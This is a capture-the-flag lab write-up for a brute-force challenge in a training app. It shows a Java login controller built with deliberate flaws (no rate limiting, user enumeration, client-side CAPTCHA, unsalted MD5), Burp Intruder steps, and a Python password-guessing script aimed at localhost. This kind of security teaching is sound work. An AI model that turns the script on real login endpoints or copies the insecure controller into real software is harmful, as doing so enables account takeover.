# Level 1 — Weak Password Cracking

## Challenge Description

This challenge simulates a login endpoint vulnerable to brute force attacks. The system lacks rate limiting, CAPTCHA protection, account lockout, and other security measures. Attackers can use automated scripts with password dictionaries to crack weak passwords.

**Objective**: Brute force any user's password. A successful login returns the Flag.

## Vulnerability Analysis

### Code Logic

The backend code is located in `BruteForceController.java`. The login endpoint:

```
POST /api/challenge/auth-session/bf/login
```

**Request body**:

```json
{
  "username": "admin",
  "password": "e10adc3949ba59abbe56e057f20f883e"
}
```

> The frontend sends the MD5 hash of the password. The backend compares it directly against the `password_md5` field in the database.

**Data Flow**:

```
Frontend input: username + password
    ↓
Frontend JS computes MD5(password)
    ↓
POST /api/challenge/auth-session/bf/login  {username, password_md5}
    ↓
Backend: BruteForceController.bruteForceLogin()
    ↓
userService.findByUsername(username) → Query user
    ↓
Compare with password_md5 field
    ↓
Match success → Return Flag
Match failure → Return "Invalid username or password"
```

**Vulnerability Points**:

1. **No Rate Limiting**: The `bruteForceLogin()` method has no request frequency control. The same IP can send unlimited login requests in a short period.

2. **User Enumeration**: When the username doesn't exist, the response returns `"The current user does not exist"`, which differs from the password error message. Attackers can use this to enumerate valid usernames.

3. **Ineffective CAPTCHA**: The frontend uses a 4-character CAPTCHA, but the validation logic is implemented in client-side JavaScript and can be easily bypassed.

### Key Source Code

```java
// BruteForceController.java — No rate limiting whatsoever
@PostMapping("/login")
public ResponseEntity<Map<String, Object>> bruteForceLogin(@RequestBody Map<String, String> loginRequest) {
    String username = loginRequest.get("username");
    String password = loginRequest.get("password");
    
    User user = userService.findByUsername(username);
    
    if (user == null) {
        // Vulnerability: User enumeration — different message from password error
        result.put("message", "The current user does not exist");
        return ResponseEntity.status(401).body(result);
    }
    
    if (!passwordMd5.equals(password)) {
        result.put("message", "Invalid username or password");
        return ResponseEntity.status(401).body(result);
    }
    
    // Login success — return Flag directly
    String flag = flagService.getFlag("auth-session", "level1");
    result.put("flag", flag);  // Returns the current level's Flag
    return ResponseEntity.ok(result);
}
```

## Walkthrough

### Step 1: Identify Target Users

Visit the login page and enter random usernames. Observe the error messages:

- Username not found → `"The current user does not exist"`
- Username exists but wrong password → `"Invalid username or password"`

Use this difference to confirm which usernames are valid. The system includes preset users: `admin`, `jack`, `lucy`, `tom`.

### Step 2: Brute Force with Burp Suite or Script

**Method 1: Burp Suite Intruder**

1. Submit a normal login request in the browser
2. Intercept the request in Burp Proxy, right-click → Send to Intruder
3. Set attack parameters: Mark the `password` field as the Payload position
4. Load a password dictionary (e.g., `rockyou.txt` or a custom weak password list)
5. Start the attack and observe successful requests containing the `"flag"` field

**Method 2: Python Script**

```python
import requests
import hashlib

url = "http://localhost:8080/api/challenge/auth-session/bf/login"
username = "jack"  # Target user

# Common weak password dictionary
passwords = ["123456", "password", "admin123", "12345678", "qwerty", "abc123"]

for pwd in passwords:
    pwd_md5 = hashlib.md5(pwd.encode()).hexdigest()
    resp = requests.post(url, json={"username": username, "password": pwd_md5})
    data = resp.json()
    
    if data.get("success"):
        print(f"[+] Cracked! User: {username}, Password: {pwd}")
        print(f"[+] Flag: {data.get('flag')}")
        break
    else:
        print(f"[-] Tried: {pwd} → {data.get('message')}")
```

### Step 3: Capture the Flag

After a successful brute force, the login response contains the Flag:

```json
{
  "success": true,
  "message": "Login successful",
  "flag": "flag{...}"
}
```

Submit the Flag in the challenge's Flag submission box to complete the level.

## Related Files

| File | Description |
|------|-------------|
| `controller/challenge/authsession/BruteForceController.java` | Backend login endpoint, no rate limiting |
| `static/challenges/auth-session/brute-force.html` | Frontend challenge page |
| `service/FlagService.java` | Flag retrieval and validation |
| `entity/User.java` | User entity (includes password_md5 field) |
